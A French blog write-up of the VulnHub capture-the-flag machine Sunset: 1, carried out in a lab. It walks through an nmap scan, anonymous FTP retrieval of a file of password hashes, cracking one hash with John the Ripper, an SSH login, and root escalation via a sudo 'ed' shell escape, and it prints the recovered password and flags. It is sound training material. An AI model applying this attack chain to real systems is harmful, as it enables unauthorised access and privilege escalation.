---
title: "CTT Sunset: 1"
date: 2021-04-29
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/sunset-1,339
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.63`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir Sunset1 && cd Sunset1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
Nmap scan report for sunset.home (192.168.1.63)
Host is up (0.00053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.1.63:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 71:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 (RSA)
|   256 35:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 (ECDSA)
|_  256 45:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On a un serveur **FTP** sur le port **21** et un serveur **SSH** sur le port **22**. On commence donc par énumérer le serveur **FTP** en tant qu'utilisateur anonyme.

```bash
$ ftp
open 192.168.1.63
Connected to 192.168.1.63.
220 pyftpdlib 1.5.5 ready.
Name (192.168.1.63:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
ftp> ls -la
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
```

Un fichier nommé "backup" est disponible.

```bash
ftp> get backup
local: backup remote: backup
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
1062 bytes received in 0.00 secs (668.2406 kB/s)
ftp> exit
221 Goodbye.
```

Regardons ce que contient le fichier "backup".

```bash
$ cat backup
CREDENTIALS:
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.
datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/
sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0
sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
```

Cela ressemble fortement à du **SHA-512**... Dans un nouveau fichier texte, on isole le compte de "sunset" (étant donné que c'est le nom du CTF) `echo 'sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/' >> sunset.txt` (bien mettre des simples quotes et non des doubles quotes) afin de lancer **John the Ripper** pour le déchiffrer.

```bash
$ john sunset.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
0g 0:00:00:52 46,72% 2/3 (ETA: 16:58:06) 0g/s 1370p/s 1370c/s 1370C/s srediaR..aeerdnA
Proceeding with incremental:ASCII
cheer14          (sunset)
```

Après quelques minutes, **John** nous trouve le mot de passe "cheer14".

## Pénétration

Maintenant que nous avons le mot de passe de l'utilisateur "sunset", on peut pénétrer sur le serveur via **SSH**.

```bash
$ ssh sunset@$IP
sunset@192.168.1.63's password: cheer14
```

Dans le répertoire de cet utilisateur, on trouve le flag user.

```bash
$ cat user.txt
5b5b8e9b01ef27a1cc0a2d5fa87d7190
```

## Escalation

Regardons les privilèges de cet utilsateur.

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/ed
```

Sur [GTFOBins](https://gtfobins.github.io/gtfobins/ed), on trouve la solution.

```bash
$ sudo ed
$ !/bin/sh
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Désormais "root", dans le répertoire de ce dernier, on trouve le flag final.

```bash
$ cat /root/flag.txt
25d7ce0ee3cbf71efbac61f85d0c14fe
```
